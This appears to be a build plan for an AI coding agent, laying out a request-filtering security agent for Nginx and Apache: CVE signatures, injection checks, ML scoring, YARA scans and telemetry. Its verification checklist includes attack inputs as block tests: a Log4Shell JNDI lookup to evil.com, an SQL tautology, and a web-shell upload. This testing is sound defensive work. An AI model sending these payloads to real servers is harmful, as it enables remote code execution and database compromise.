# Agent Instructions: AISS Build Plan

## Mission

Build a production-grade, ML-enabled HTTP security agent for Nginx and Apache that intercepts
every request, validates it against CVE signatures + ML anomaly detection, and returns a
PERMIT / BLOCK verdict in **< 5 ms** at **10,000 requests/sec**.

---

## Phase 1 — Core Bridge (UDS + C Module)

### 1.1 Unix Domain Socket Listener (`internal/socket/server.go`)
- Listen on `/tmp/aiss.sock` using `net.Listen("unix", path)`.
- Set permissions to `0660` (Nginx/Apache run as `www-data`; agent runs as `aiss`).
- Use a **bounded goroutine pool** (`semaphore channel`) with `MaxWorkers` from config.
- Implement **Fail-Open**: if the security pipeline exceeds `SocketTimeoutMs`, write
  `{"action":"PERMIT","reason":"fail-open: pipeline timeout"}` and continue.
- Request format: newline-terminated JSON (`socket.Request` struct).
- Response format: newline-terminated JSON (`socket.Response` struct).

### 1.2 Nginx Module (`module/nginx/ngx_http_aiss_module.c`)
- Hook into `NGX_HTTP_PREACCESS_PHASE` for header-only checks.
- For dynamic content types (`application/json`, `x-www-form-urlencoded`, `multipart/form-data`,
  `application/xml`, `text/plain`), call `ngx_http_read_client_request_body` asynchronously.
- In the body callback: serialise headers + first `AISS_BODY_SAMPLE_BYTES` (4096) bytes as JSON,
  send over UDS, parse `"action"` field, return `NGX_HTTP_FORBIDDEN` on BLOCK or `NGX_DECLINED`.
- **Shared-Memory Verdict Cache**: on module init (`ngx_http_aiss_init_worker`), attach to
  `/aiss_verdict_cache` POSIX shm. On PERMIT, write `{ip, verdict, expires_at}` into the shm
  hash table. On next request from same IP within TTL, skip UDS call entirely.
- Directives: `aiss_enable on|off`, `aiss_socket /path`, `aiss_timeout <ms>`.
- Fail-Open: return `NGX_DECLINED` if agent socket is unreachable.

### 1.3 Apache Module (`module/apache/mod_aiss.c`)
- Hook with `ap_hook_access_checker(..., APR_HOOK_FIRST)`.
- Read up to 4096 bytes of request body using `ap_should_client_block` /
  `ap_get_client_block` into a local buffer.
- Serialise headers + body sample as JSON, send over UDS.
- Same POSIX shm verdict cache as Nginx module (`/aiss_verdict_cache`).
- Directives: `AISSEnable On|Off`, `AISSSocket /path`, `AISSTimeout <ms>`.

---

## Phase 2 — Security Pipeline (`internal/security/`)

### 2.1 Tier 1 — CVE Pattern Matching (`tier1/`)
- **Default (regexp):** compile patterns from `rules/hyperscan/cve_patterns.json` into
  `[]*regexp.Regexp` at startup. Sort CRITICAL-first for early exit.
- **Build tag `hyperscan`:** use `github.com/flier/gohs` to build a Hyperscan block database
  from the same patterns. Per-goroutine `Scratch` from a `sync.Pool`.
- Expose a common `Engine` interface so the pipeline is unaware of which backend is active.
- Support hot-reload via `Engine.Load(patternsFile string)` (called on `SIGHUP`).

### 2.2 Tier 2 — Injection Analysis (`tier2/`)
- SQL injection: structural regex (UNION SELECT, stacked queries, tautologies, comments).
- XSS: script tags, `javascript:` protocol, DOM event handlers, data-URIs, SVG payloads,
  HTML-entity-encoded payloads.
- Apply all checks against URL-decoded AND double-decoded variants for bypass detection.

### 2.3 Tier 3 — ML Anomaly Detection (`tier3/`)
- **Default (heuristic):** 22-feature scoring function returning 0.0–1.0.
  Block threshold configurable via `MLThreshold` (default `0.85`).
- **Build tag `onnx`:** load `agent/ml/aiss_model.onnx` via `github.com/yalue/onnxruntime_go`.
  Extract the same 22 features, run inference, use the output probability as the score.
  ONNX session is created once at startup and reused across goroutines (thread-safe).
- Training script: `scripts/train_model.py` — trains a `GradientBoostingClassifier` on
  synthetic feature data and exports to ONNX via `sklearn-onnx`.

### 2.4 Content Inspection (`content/`)
- Streaming Base64 decode using `encoding/base64.NewDecoder`.
- Magic byte validation: detect type mismatches (e.g., EXE uploaded as PNG).
- Shannon entropy — high entropy body + YARA hit → BLOCK.
- YARA scanning via `go-yara` CGO bindings or compiled-rule fallback.
- **Threshold inspection:**
  - `< ContentFullScanLimit` (10 KB default): full decode + YARA + entropy.
  - `10 KB – ContentSampleLimit` (1 MB default): sample head/mid/tail.
  - `> ContentSampleLimit`: pass inline, async YARA scan in background goroutine.
- SHA-256 hash dedup: results cached in DuckDB `file_hashes` table.

---

## Phase 3 — Data Layer

### 3.1 DuckDB Local Store (`internal/db/store.go`)
- Tables: `cve_signatures`, `ip_reputation` (TTL), `file_hashes`, `security_events`,
  `agent_config`.
- Single-writer goroutine with batch transactions (up to 200 ops/tx) for throughput.
- All reads are lock-protected but never block the hot path for more than 100 µs.

### 3.2 Apache Doris (Central Analytics)
- Connection: MySQL protocol on `doris-fe:9030` via `pymysql` / SQLAlchemy.
- Tables: `security_events`, `cve_signatures`, `agents`.
- Agent telemetry is **never written synchronously** — Python server batches gRPC events and
  calls Doris Stream Load every 1 s or 5 000 events, whichever comes first.

---

## Phase 4 — Telemetry & Updates (gRPC)

### 4.1 Proto (`proto/aiss.proto`)
```proto
service AISS {
  rpc SubmitTelemetry(TelemetryBatch) returns (TelemetryAck);
  rpc GetCVEUpdates(UpdateRequest)   returns (stream CVESignature);
  rpc RegisterAgent(AgentInfo)       returns (AgentAck);
}
```

### 4.2 Go gRPC Sink (`internal/telemetry/grpc_sink.go`)
- Implements `telemetry.Sink` interface.
- Opens a persistent gRPC connection to the central server on startup.
- Calls `SubmitTelemetry` in batches (flush interval from config).
- Reconnects on error with exponential back-off.

### 4.3 CVE Puller (`internal/updater/cve_puller.go`)
- Calls `GetCVEUpdates` — streaming RPC — to receive CVE signature deltas.
- Applies each delta to the Tier 1 engine via `PatternReloader` interface.
- Persists `last_cve_sync` timestamp in DuckDB `agent_config`.

### 4.4 Python gRPC Server (`server/`)
- Runs alongside FastAPI on the same process using `grpc.aio`.
- `SubmitTelemetry`: enqueues events into an in-memory deque; background task batch-inserts
  into Doris every 1 s.
- `GetCVEUpdates`: streams rows from `cve_signatures` WHERE `modified_at > since`.
- `RegisterAgent`: upserts into `agents` table.

---

## Phase 5 — CVE Intelligence (`server/app/cve_sync.py`)

Pull from **three sources** on a schedule (`CVE_SYNC_INTERVAL_HOURS`):

| Source | URL | What we get |
|---|---|---|
| NVD v2 | `https://services.nvd.nist.gov/rest/json/cves/2.0` | CRITICAL CVEs, last 30 days |
| CISA KEV | `https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json` | Actively exploited CVEs |
| OSV.dev | `https://api.osv.dev/v1/query` | Open-source library CVEs by ecosystem |

Normalise all sources into `CVESignature` rows and upsert into the server DuckDB / Doris.

---

## Verification Checklist

- [ ] `wrk -t4 -c100 -d30s http://localhost/` → ≥ 10 000 RPS, p99 < 10 ms.
- [ ] `curl -H 'User-Agent: ${jndi:ldap://evil.com/a}'` → 403 Forbidden (Tier 1).
- [ ] `curl -d "q=' OR 1=1--"` → 403 Forbidden (Tier 2).
- [ ] Upload PHP web shell as Base64 body → 403 Forbidden (Content / YARA).
- [ ] DuckDB IP lookup latency < 500 µs (`SELECT * FROM ip_reputation WHERE ip=?`).
- [ ] gRPC `SubmitTelemetry` reaches Doris within 1 s of the event.
- [ ] `kill -HUP $(pgrep aiss-agent)` → new CVE patterns loaded without restart.
- [ ] Stop agent process → Nginx continues serving (Fail-Open).
- [ ] Shared-memory cache: second request from same IP skips UDS call (check agent logs).
